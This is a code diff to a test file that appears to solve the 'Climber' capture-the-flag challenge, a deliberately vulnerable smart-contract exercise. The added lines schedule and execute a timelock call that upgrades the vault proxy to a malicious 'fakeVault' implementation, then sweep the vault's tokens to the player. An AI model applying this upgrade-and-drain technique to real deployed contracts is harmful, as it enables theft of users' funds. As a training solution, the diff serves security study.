@@ -119,6 +119,14 @@ describe("[Challenge] Climber", function () {
     await climberAttack.checkRole();
     let hasRole = await climberAttack.hasRole();
     console.log(hasRole);
+
+    //Upgrade vault proxy to malicous implementation fakeVault
+    abi1 = ["function upgradeTo(address newImplementation)"];
+    iface1 = new ethers.utils.Interface(abi1);
+    data1 = iface1.encodeFunctionData("upgradeTo", [fakeVault.address]);
+    await climberAttack.schedule([vault.address], [0], [data1], salt);
+    await timelock.execute([vault.address], [0], [data1], salt);
+    await vault.connect(player).sweepFunds(token.address);
   });
 
   after(async function () {
